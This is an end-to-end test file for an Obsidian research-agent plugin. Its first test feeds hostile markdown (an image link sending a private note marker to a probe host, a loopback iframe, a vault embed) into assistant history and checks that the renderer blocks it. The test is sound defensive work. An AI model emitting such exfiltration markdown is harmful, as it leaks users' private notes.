import { expect, test } from "@playwright/test";

import {
  NATIVE_CORE_PLUGIN_ID,
  startNativeObsidianHarness,
  type NativeObsidianHarness,
} from "./fixtures/nativeObsidianHarness";
import { laneSelectedV1 } from "./fixtures/laneSelection";
import {
  advanceProjectLineageV1,
  createProjectLineageV1,
  createResearcherHandoffV1,
  parseProjectLineageV1,
  type ProjectLineageV1,
} from "../src/agent/projectLifecycle";
import {
  advanceDeveloperMissionToValidation,
  mountDeveloperMissionProgressUi,
  presentDeveloperMissionCompletionUi,
} from "./fixtures/developerMissionUi";
import {
  createProjectStageEventV1,
  type ProjectEvidenceKindV1,
  type ProjectPhaseV1,
  type ProjectStageEventV1,
} from "../src/agent/projectRunReport";
import { createAcceptedResearchArtifactV1 } from "../src/integrations/linear/AcceptedResearchArtifactV1";
import { verifiedCodeReflectionFixture } from "../tests/fixtures/verifiedCodeReflection";

const LANE = "safe-assistant-renderer";

test("assistant history renders inertly without remote requests, HTML, or vault embeds", async () => {
  test.skip(process.platform !== "win32", "Obsidian desktop e2e requires Windows.");
  test.skip(!laneSelectedV1(LANE), `Run only with E2E_PLAYWRIGHT_LANE=${LANE}.`);
  test.setTimeout(4 * 60_000);

  const probeHost = "renderer-probe.invalid";
  const privateMarker = `PRIVATE_NOTE_${Date.now()}`;
  const maliciousMarkdown = [
    "# Safe assistant result",
    `![remote](https://${probeHost}/collect?note=${privateMarker})`,
    `![loopback](http://127.0.0.1:9/admin?note=${privateMarker})`,
    `![[E2E Agent Tests/${privateMarker}.md]]`,
    `<iframe src="http://127.0.0.1:9/private?note=${privateMarker}"></iframe>`,
    `<img src="https://${probeHost}/pixel?note=${privateMarker}">`,
    `[ordinary link](https://${probeHost}/manual-only)`,
  ].join("\n");
  const activeProbeRequests: string[] = [];
  let harness: NativeObsidianHarness | null = null;

  try {
    harness = await startNativeObsidianHarness({
      label: "safe-assistant-renderer",
      setup: async ({ page }) => {
        page.on("request", (request) => {
          const url = request.url();
          if (url.includes(probeHost) || url.startsWith("http://127.0.0.1:9/")) {
            activeProbeRequests.push(url);
          }
        });
        await page.evaluate(
          async ({ pluginId, markdown }) => {
            const app = (window as typeof window & { app?: any }).app;
            const plugin = app?.plugins?.plugins?.[pluginId];
            if (!plugin) throw new Error("Agentic Researcher plugin is unavailable.");
            for (const leaf of app.workspace?.getLeavesOfType?.("agentic-researcher-view") ?? []) {
              leaf.detach?.();
            }
            plugin.conversationHistory = [{ role: "assistant", content: markdown }];
            await plugin.activateView?.();
          },
          { pluginId: NATIVE_CORE_PLUGIN_ID, markdown: maliciousMarkdown },
        );
      },
    });

    const message = harness.page.locator(
      ".agentic-researcher-log-assistant .agentic-researcher-log-message",
    );
    await expect(message).toHaveCount(1);
    await expect(message).toHaveClass(/is-rendered/u);
    await expect(message).toContainText("Safe assistant result");
    await expect(message).toContainText("Image blocked: remote");
    await expect(message).toContainText("Image blocked: loopback");
    await expect(message).toContainText(
      `Vault embed blocked: E2E Agent Tests/${privateMarker}.md`,
    );
    await expect(message).toContainText("HTML blocked");
    await expect(message).toContainText(
      `ordinary link (https://${probeHost}/manual-only)`,
    );
    await expect(message.locator("img, iframe, embed, object, a")).toHaveCount(0);
    await harness.page.waitForTimeout(500);
    expect(
      activeProbeRequests,
      "provider-authored assistant history must not trigger remote or loopback requests",
    ).toEqual([]);
  } finally {
    await harness?.close();
  }
});

test("developer mission progress transitions and completion links render in native Chat", async () => {
  test.skip(process.platform !== "win32", "Obsidian desktop e2e requires Windows.");
  test.skip(!laneSelectedV1(LANE), `Run only with E2E_PLAYWRIGHT_LANE=${LANE}.`);
  test.setTimeout(4 * 60_000);

  let harness: NativeObsidianHarness | null = null;
  try {
    harness = await startNativeObsidianHarness({
      label: "developer-mission-ui",
      setup: async ({ page }) => {
        await mountDeveloperMissionProgressUi(page);
      },
    });

    const liveStrip = harness.page.getByTestId("developer-mission-stage-strip");
    await expect(liveStrip).toBeVisible();
    await expect(liveStrip.locator("[data-phase]"))
      .toHaveText(["•Research", "•Linear plan", "•Implement", "•Test", "•GitHub", "•Reflect"]);
    await expect(liveStrip.locator('[data-phase="implement"]')).toHaveAttribute(
      "data-status",
      "pending",
    );

    await advanceDeveloperMissionToValidation(harness.page);
    await expect(liveStrip.locator('[data-phase="implement"]')).toHaveAttribute(
      "data-status",
      "complete",
    );
    await expect(liveStrip.locator('[data-phase="test"]')).toHaveAttribute(
      "data-status",
      "active",
    );
    await expect(liveStrip.locator('[data-phase="test"]')).toHaveAttribute(
      "aria-current",
      "step",
    );

    await presentDeveloperMissionCompletionUi(harness.page);
    const completion = harness.page.getByTestId("developer-mission-completion");
    await expect(completion).toBeVisible();
    await expect(completion).toContainText("Project run complete");
    await expect(completion.locator('[data-status="complete"]')).toHaveCount(6);
    await expect(completion.getByTestId("developer-mission-artifact-results"))
      .toHaveAttribute("data-href", "Agent Work/Results/e2e-developer-mission-ui.md");
    await expect(completion.getByTestId("developer-mission-artifact-linear"))
      .toHaveAttribute("href", "https://linear.app/example/issue/ENG-42");
    await expect(completion.getByTestId("developer-mission-artifact-validation"))
      .toHaveRole("button");
    await expect(completion.getByTestId("developer-mission-artifact-commit"))
      .toHaveAttribute("rel", "noopener noreferrer");
    await expect(completion.getByTestId("developer-mission-artifact-pull_request"))
      .toHaveAttribute("target", "_blank");
  } finally {
    await harness?.close();
  }
});

test("native Results writer creates one exact host-derived lab report and reconciles without replay", async () => {
  test.skip(process.platform !== "win32", "Obsidian desktop e2e requires Windows.");
  test.skip(!laneSelectedV1(LANE), `Run only with E2E_PLAYWRIGHT_LANE=${LANE}.`);
  test.setTimeout(4 * 60_000);

  const runId = `e2e-project-results-${Date.now()}`;
  const generatedAt = new Date().toISOString();
  const lineage = createPaidResultsLineage(runId, generatedAt);
  const stageEvents = createPaidWorkUnitEvents(runId, generatedAt);
  const { examples: verifiedCodeExamples } = verifiedCodeReflectionFixture(
    RESULTS_COMMIT_SHA,
  );
  let observed:
    | {
        path: string;
        markdown: string;
        markdownMatchesPreparedBytes: boolean;
        receiptTool: string | null;
        receiptActionMatches: boolean;
        receiptPayloadMatches: boolean;
        receiptPath: string | null;
        readbackStatus: string | null;
        readbackMatchesPreparedSha: boolean;
        mutationState: string | null;
        reconcileOutcome: string;
        reconcileCommitKind: string | null;
        reconcileReadbackMatchesPreparedSha: boolean;
        reconcileMessage: string;
        targetCreateCalls: number;
        reportComplete: boolean | null;
        phaseStatuses: Array<{ phase: string; status: string }> | null;
        workUnitOutcomes: Array<{
          workUnitId: string;
          linearIssueIdentifier: string | null;
          status: string;
          paidAcceptanceCriterionIds: string[];
          unpaidAcceptanceCriterionIds: string[];
          proofDebt: string[];
        }> | null;
      }
    | undefined;
  let harness: NativeObsidianHarness | null = null;

  try {
    harness = await startNativeObsidianHarness({
      label: "project-results-writer",
      setup: async ({ page, marker }) => {
        const resultsPath = `E2E Agent Tests/Results-${marker}.md`;
        observed = await page.evaluate(
          async ({
            pluginId,
            runId,
            generatedAt,
            resultsPath,
            lineage,
            stageEvents,
            verifiedCodeExamples,
          }) => {
            const app = (window as typeof window & { app?: any }).app;
            const plugin = app?.plugins?.plugins?.[pluginId];
            if (!plugin) throw new Error("Agentic Researcher plugin is unavailable.");
            const registry = plugin.createToolRegistry?.();
            if (!registry?.prepare || !registry?.executePrepared || !registry?.reconcile) {
              throw new Error("Prepared tool registry is unavailable.");
            }
            const prompt = `Write the project Results report to \`${resultsPath}\`.`;
            const context = {
              ...plugin.createToolExecutionContext(prompt),
              runId,
              rootMissionId: runId,
              operationId: "e2e-write-project-results",
              now: () => new Date(generatedAt),
              getProjectStageEvents: (requestedRunId: string) => {
                if (requestedRunId !== runId) {
                  throw new Error(`Unexpected project event run: ${requestedRunId}`);
                }
                return stageEvents;
              },
              getProjectLineages: () => [lineage],
              resolveVerifiedCodeReflectionExamples: async (binding: {
                repositoryProfileKey: string;
                commitSha: string;
              }) => {
                if (
                  binding.repositoryProfileKey !== "reflection-fixture" ||
                  binding.commitSha !== verifiedCodeExamples.commitSha
                ) {
                  throw new Error("Unexpected exact-code reflection binding.");
                }
                return verifiedCodeExamples;
              },
            };
            const prepared = await registry.prepare(
              {
                id: "e2e-write-project-results",
                name: "write_project_results",
                arguments: {},
              },
              context,
            );
            if (!prepared.ok) {
              throw new Error(`${prepared.error.code}: ${prepared.error.message}`);
            }
            const authorization = {
              preparedActionId: prepared.action.id,
              payloadFingerprint: prepared.action.payloadFingerprint,
              grantId: "e2e-exact-results-approval",
            };
            const expectedAfterSha256 = String(
              prepared.action.normalizedArgs.expectedAfterSha256,
            );
            const preparedMarkdown = String(
              prepared.action.normalizedArgs.proposedMarkdown,
            );
            const originalCreate = app.vault.create;
            let targetCreateCalls = 0;
            app.vault.create = async function (path: string, ...args: unknown[]) {
              if (path === resultsPath) targetCreateCalls += 1;
              return originalCreate.call(this, path, ...args);
            };
            let executed: any;
            let reconciled: any;
            try {
              executed = await registry.executePrepared(
                prepared.action,
                context,
                authorization,
              );
              if (!executed.ok) {
                throw new Error(`${executed.error?.code}: ${executed.error?.message}`);
              }
              reconciled = await registry.reconcile(prepared.action, context);
            } finally {
              app.vault.create = originalCreate;
            }
            const file = app.vault.getAbstractFileByPath(resultsPath);
            if (!file || file.extension !== "md") {
              throw new Error("The exact Results note was not created.");
            }
            const markdown = await app.vault.cachedRead(file);
            const report = executed.output?.report;
            return {
              path: resultsPath,
              markdown,
              markdownMatchesPreparedBytes: markdown === preparedMarkdown,
              receiptTool: executed.receipt?.toolName ?? null,
              receiptActionMatches: executed.receipt?.actionId === prepared.action.id,
              receiptPayloadMatches:
                executed.receipt?.payloadFingerprint === prepared.action.payloadFingerprint,
              receiptPath: executed.receipt?.resource?.path ?? null,
              readbackStatus: executed.receipt?.readback?.status ?? null,
              readbackMatchesPreparedSha:
                executed.receipt?.readback?.observedFingerprint === expectedAfterSha256,
              mutationState: executed.mutationState ?? null,
              reconcileOutcome: reconciled.outcome,
              reconcileCommitKind: reconciled.receipt?.commitKind ?? null,
              reconcileReadbackMatchesPreparedSha:
                reconciled.receipt?.readback?.observedFingerprint === expectedAfterSha256,
              reconcileMessage: reconciled.message,
              targetCreateCalls,
              reportComplete:
                typeof report?.complete === "boolean"
                  ? report.complete
                  : null,
              phaseStatuses: Array.isArray(report?.phases)
                ? report.phases.map((phase: any) => ({
                    phase: String(phase.phase),
                    status: String(phase.status),
                  }))
                : null,
              workUnitOutcomes: Array.isArray(report?.workUnitOutcomes)
                ? report.workUnitOutcomes
                : null,
            };
          },
          {
            pluginId: NATIVE_CORE_PLUGIN_ID,
            runId,
            generatedAt,
            resultsPath,
            lineage,
            stageEvents,
            verifiedCodeExamples,
          },
        );
      },
    });

    expect(observed?.receiptTool).toBe("write_project_results");
    expect(observed?.receiptActionMatches).toBe(true);
    expect(observed?.receiptPayloadMatches).toBe(true);
    expect(observed?.receiptPath).toBe(observed?.path);
    expect(observed?.readbackStatus).toBe("verified");
    expect(observed?.readbackMatchesPreparedSha).toBe(true);
    expect(observed?.markdownMatchesPreparedBytes).toBe(true);
    expect(observed?.mutationState).toBe("applied");
    expect(observed?.reconcileOutcome).toBe("committed");
    expect(observed?.reconcileCommitKind).toBe("reconciled");
    expect(observed?.reconcileReadbackMatchesPreparedSha).toBe(true);
    expect(observed?.reconcileMessage).toContain("no create was replayed");
    expect(observed?.targetCreateCalls).toBe(1);
    expect(observed?.phaseStatuses).toEqual([
      { phase: "research", status: "verified" },
      { phase: "linear_plan", status: "verified" },
      { phase: "implement", status: "verified" },
      { phase: "test", status: "verified" },
      { phase: "github", status: "verified" },
      { phase: "reflect", status: "verified" },
    ]);
    expect(observed?.reportComplete).toBe(true);
    expect(observed?.workUnitOutcomes).toEqual([
      expect.objectContaining({
        workUnitId: "delivery-issue",
        linearIssueIdentifier: "ENG-42",
        status: "paid",
        paidAcceptanceCriterionIds: ["delivery-issue:AC-1"],
        unpaidAcceptanceCriterionIds: [],
        proofDebt: [],
      }),
    ]);
    expect(observed?.markdown).toContain("## High-level phase reflection");
    expect(observed?.markdown).toContain("## Scientific reflection");
    expect(observed?.markdown).toContain("### ENG-42 / delivery-issue");
    expect(observed?.markdown).toContain("- Outcome: **Paid**");
    expect(observed?.markdown).toContain("- Proof debt:\n  - None");
    expect(observed?.markdown).toContain("The research and high-level design were accepted");
    expect(observed?.markdown).toContain("- Outcome: Complete");
    expect(observed?.path).toMatch(/^E2E Agent Tests\/Results-E2E_MARKER_/u);
  } finally {
    await harness?.close();
  }
});

test("natural Jupyter reflection creates one unexecuted Results notebook and reconciles without replay", async () => {
  test.skip(process.platform !== "win32", "Obsidian desktop e2e requires Windows.");
  test.skip(!laneSelectedV1(LANE), `Run only with E2E_PLAYWRIGHT_LANE=${LANE}.`);
  test.setTimeout(4 * 60_000);

  const runId = `e2e-project-notebook-${Date.now()}`;
  const generatedAt = new Date().toISOString();
  const lineage = createPaidResultsLineage(runId, generatedAt);
  const stageEvents = createPaidWorkUnitEvents(runId, generatedAt);
  const { examples: verifiedCodeExamples } = verifiedCodeReflectionFixture(
    RESULTS_COMMIT_SHA,
  );
  let observed:
    | {
        path: string;
        mode: string;
        destinationSource: string;
        expectedTargetRevision: string | null;
        notebookMatchesPreparedBytes: boolean;
        nbformat: number;
        nbformatMinor: number;
        codeCells: Array<{ executionCount: unknown; outputs: unknown[] }>;
        receiptTool: string | null;
        readbackStatus: string | null;
        readbackMatchesPreparedSha: boolean;
        executionPerformed: boolean | null;
        reconcileOutcome: string;
        reconcileCommitKind: string | null;
        targetCreateCalls: number;
        reportComplete: boolean | null;
      }
    | undefined;
  let harness: NativeObsidianHarness | null = null;

  try {
    harness = await startNativeObsidianHarness({
      label: "project-jupyter-results-writer",
      setup: async ({ page }) => {
        observed = await page.evaluate(
          async ({
            pluginId,
            runId,
            generatedAt,
            lineage,
            stageEvents,
            verifiedCodeExamples,
          }) => {
            const app = (window as typeof window & { app?: any }).app;
            const plugin = app?.plugins?.plugins?.[pluginId];
            if (!plugin) throw new Error("Agentic Researcher plugin is unavailable.");
            const registry = plugin.createToolRegistry?.();
            if (!registry?.prepare || !registry?.executePrepared || !registry?.reconcile) {
              throw new Error("Prepared tool registry is unavailable.");
            }
            const prompt =
              "Write the final scientific reflection to a Jupyter notebook without executing cells.";
            const context = {
              ...plugin.createToolExecutionContext(prompt),
              runId,
              rootMissionId: runId,
              operationId: "e2e-create-project-jupyter-results",
              now: () => new Date(generatedAt),
              getProjectStageEvents: (requestedRunId: string) => {
                if (requestedRunId !== runId) {
                  throw new Error(`Unexpected project event run: ${requestedRunId}`);
                }
                return stageEvents;
              },
              getProjectLineages: () => [lineage],
              resolveVerifiedCodeReflectionExamples: async (binding: {
                repositoryProfileKey: string;
                commitSha: string;
              }) => {
                if (
                  binding.repositoryProfileKey !== "reflection-fixture" ||
                  binding.commitSha !== verifiedCodeExamples.commitSha
                ) {
                  throw new Error("Unexpected exact-code reflection binding.");
                }
                return verifiedCodeExamples;
              },
            };
            const prepared = await registry.prepare(
              {
                id: "e2e-create-project-jupyter-results",
                name: "append_jupyter_reflection",
                arguments: {
                  markdown:
                    "This notebook is the concise, receipt-derived scientific record of the completed developer mission.",
                },
              },
              context,
            );
            if (!prepared.ok) {
              throw new Error(`${prepared.error.code}: ${prepared.error.message}`);
            }
            const path = String(prepared.action.target.path ?? "");
            const expectedAfterSha256 = String(
              prepared.action.normalizedArgs.expectedAfterSha256,
            );
            const proposedNotebook = String(
              prepared.action.normalizedArgs.proposedNotebook,
            );
            const authorization = {
              preparedActionId: prepared.action.id,
              payloadFingerprint: prepared.action.payloadFingerprint,
              grantId: "e2e-exact-jupyter-results-approval",
            };
            const originalCreate = app.vault.create;
            let targetCreateCalls = 0;
            app.vault.create = async function (createdPath: string, ...args: unknown[]) {
              if (createdPath === path) targetCreateCalls += 1;
              return originalCreate.call(this, createdPath, ...args);
            };
            let executed: any;
            let reconciled: any;
            try {
              executed = await registry.executePrepared(
                prepared.action,
                context,
                authorization,
              );
              if (!executed.ok) {
                throw new Error(`${executed.error?.code}: ${executed.error?.message}`);
              }
              reconciled = await registry.reconcile(prepared.action, context);
            } finally {
              app.vault.create = originalCreate;
            }
            const file = app.vault.getAbstractFileByPath(path);
            if (!file || file.extension !== "ipynb") {
              throw new Error("The deterministic Jupyter Results notebook was not created.");
            }
            const notebookText = await app.vault.cachedRead(file);
            const notebook = JSON.parse(notebookText);
            return {
              path,
              mode: String(prepared.action.normalizedArgs.mode),
              destinationSource: String(
                prepared.action.normalizedArgs.destinationSource,
              ),
              expectedTargetRevision:
                prepared.action.expectedTargetRevision ?? null,
              notebookMatchesPreparedBytes: notebookText === proposedNotebook,
              nbformat: Number(notebook.nbformat),
              nbformatMinor: Number(notebook.nbformat_minor),
              codeCells: notebook.cells
                .filter((cell: any) => cell.cell_type === "code")
                .map((cell: any) => ({
                  executionCount: cell.execution_count,
                  outputs: cell.outputs,
                })),
              receiptTool: executed.receipt?.toolName ?? null,
              readbackStatus: executed.receipt?.readback?.status ?? null,
              readbackMatchesPreparedSha:
                executed.receipt?.readback?.observedFingerprint === expectedAfterSha256,
              executionPerformed:
                typeof executed.output?.executionPerformed === "boolean"
                  ? executed.output.executionPerformed
                  : null,
              reconcileOutcome: reconciled.outcome,
              reconcileCommitKind: reconciled.receipt?.commitKind ?? null,
              targetCreateCalls,
              reportComplete:
                typeof executed.output?.report?.complete === "boolean"
                  ? executed.output.report.complete
                  : null,
            };
          },
          {
            pluginId: NATIVE_CORE_PLUGIN_ID,
            runId,
            generatedAt,
            lineage,
            stageEvents,
            verifiedCodeExamples,
          },
        );
      },
    });

    expect(observed?.path).toMatch(
      /^Agent Work\/Results\/[a-z0-9-]+\/\d{4}-\d{2}-\d{2}-[a-z0-9-]+\.ipynb$/u,
    );
    expect(observed?.mode).toBe("create");
    expect(observed?.destinationSource).toBe("default");
    expect(observed?.expectedTargetRevision).toBe("absent");
    expect(observed?.notebookMatchesPreparedBytes).toBe(true);
    expect(observed?.nbformat).toBe(4);
    expect(observed?.nbformatMinor).toBe(5);
    expect(observed?.codeCells.length).toBeGreaterThan(0);
    expect(observed?.codeCells.every(
      (cell) => cell.executionCount === null && cell.outputs.length === 0,
    )).toBe(true);
    expect(observed?.receiptTool).toBe("append_jupyter_reflection");
    expect(observed?.readbackStatus).toBe("verified");
    expect(observed?.readbackMatchesPreparedSha).toBe(true);
    expect(observed?.executionPerformed).toBe(false);
    expect(observed?.reconcileOutcome).toBe("committed");
    expect(observed?.reconcileCommitKind).toBe("reconciled");
    expect(observed?.targetCreateCalls).toBe(1);
    expect(observed?.reportComplete).toBe(true);
  } finally {
    await harness?.close();
  }
});

const SHA = (character: string): string => `sha256:${character.repeat(64)}`;
const RESULTS_COMMIT_SHA = "c".repeat(40);

function createPaidResultsLineage(
  runId: string,
  generatedAt: string,
): ProjectLineageV1 {
  const at = (minutesBefore: number) =>
    new Date(Date.parse(generatedAt) - minutesBefore * 60_000).toISOString();
  const artifact = createAcceptedResearchArtifactV1({
    schemaVersion: 1,
    artifactId: "e2e-results-accepted-research",
    originRunId: runId,
    vaultBindingKey: "e2e-results-vault-binding",
    notePath: "E2E Agent Tests/Accepted Research.md",
    noteSha256: SHA("a"),
    noteReceiptId: "e2e-results-note-receipt",
    evidence: [{
      id: "e2e-results-research-source",
      kind: "web",
      reference: "https://example.com/e2e-project-results",
      contentSha256: SHA("b"),
    }],
    acceptanceCriteria: [{
      id: "AC-1",
      text: "The exact delivery issue is acceptance-tested and published as a draft PR.",
    }],
    riskClass: "medium",
    acceptedAt: at(9),
    acceptedBy: "host",
  });
  const handoff = createResearcherHandoffV1({
    artifact,
    runId,
    taskId: "e2e-results-research-task",
    evidenceIds: ["e2e-results-research-source"],
    summary: "Accepted research for the exact paid Results work-unit E2E fixture.",
    unresolvedQuestions: [],
    acceptedAt: at(9),
  });
  const researchLineage = createProjectLineageV1({
    lineageId: "e2e-results-project-lineage",
    runId,
    vaultBindingKey: "e2e-results-vault-binding",
    handoff,
    updatedAt: at(9),
  });
  let lineage = advanceProjectLineageV1({
    lineage: researchLineage,
    committedAt: at(8),
    proof: {
      stage: "linear_hierarchy",
      planFingerprint: SHA("c"),
      workspaceId: "e2e-linear-workspace",
      teamId: "e2e-linear-team",
      initiativeId: "e2e-linear-initiative",
      projectId: "e2e-linear-project",
      issueIds: ["e2e-linear-issue"],
      workItemFingerprints: [SHA("d")],
      providerReadbackFingerprints: [SHA("e"), SHA("f"), SHA("0")],
      workUnits: [{
        workUnitId: "delivery-issue",
        linearIssueId: "e2e-linear-issue",
        linearIssueIdentifier: "ENG-42",
        linearIssueUrl: "https://linear.app/example/issue/ENG-42/e2e-results",
        acceptanceCriterionIds: ["delivery-issue:AC-1"],
        providerReadbackFingerprint: SHA("0"),
      }],
    },
  });
  const codeProof = {
    stage: "code_execution" as const,
    repositoryProfileKey: "reflection-fixture",
    repositoryProfileFingerprint: SHA("6"),
    workspaceId: "e2e-code-workspace",
    validationReceiptFingerprints: [SHA("7"), SHA("8")],
    diffFingerprint: SHA("9"),
    targetedValidationPassed: true as const,
    freshFullValidationPassed: true as const,
    commitSha: RESULTS_COMMIT_SHA,
    commitReadbackFingerprint: SHA("1"),
  };
  lineage = advanceProjectLineageV1({
    lineage,
    committedAt: at(7),
    proof: codeProof,
  });
  lineage = advanceProjectLineageV1({
    lineage,
    committedAt: at(6),
    proof: {
      ...codeProof,
      stage: "code_validation",
      validationReceiptFingerprints: [SHA("2"), SHA("3")],
      commitReadbackFingerprint: SHA("4"),
    },
  });
  return parseProjectLineageV1(lineage);
}

function createPaidWorkUnitEvents(
  runId: string,
  generatedAt: string,
): ProjectStageEventV1[] {
  const at = (minutesBefore: number) =>
    new Date(Date.parse(generatedAt) - minutesBefore * 60_000).toISOString();
  const event = (
    evidenceKind: ProjectEvidenceKindV1,
    phase: ProjectPhaseV1,
    minutesBefore: number,
    fingerprintCharacter: string,
    acceptanceCriterionIds: string[] = [],
  ) => createProjectStageEventV1({
    schemaVersion: 1,
    runId,
    phase,
    evidenceKind,
    disposition: "verified",
    occurredAt: at(minutesBefore),
    sourceReceiptId: `e2e-results-${evidenceKind}-receipt`,
    evidenceFingerprint: SHA(fingerprintCharacter),
    resource: {
      system: phase === "github"
        ? "github"
        : evidenceKind === "acceptance_criterion" ||
            evidenceKind === "commit_readback"
          ? "git"
          : "workspace",
      resourceType: evidenceKind,
      id: `e2e-results-${evidenceKind}`,
      url: phase === "github"
        ? evidenceKind === "github_draft_pr_readback"
          ? "https://github.com/example/e2e-results/pull/42"
          : "https://github.com/example/e2e-results"
        : null,
      path: phase === "implement" ? "src/e2e-results.ts" : null,
      revision: evidenceKind === "commit_readback"
        ? RESULTS_COMMIT_SHA
        : SHA(fingerprintCharacter),
    },
    workUnits: [{
      workUnitId: "delivery-issue",
      acceptanceCriterionIds,
    }],
  });
  return [
    event("workspace_mutation", "implement", 7, "1"),
    event("targeted_validation", "test", 6, "2"),
    event("full_validation", "test", 5, "3"),
    event("commit_readback", "test", 4, "4"),
    event(
      "acceptance_criterion",
      "test",
      3,
      "5",
      ["delivery-issue:AC-1"],
    ),
    event("github_repository_readback", "github", 2, "6"),
    event("github_draft_pr_readback", "github", 1, "7"),
  ];
}
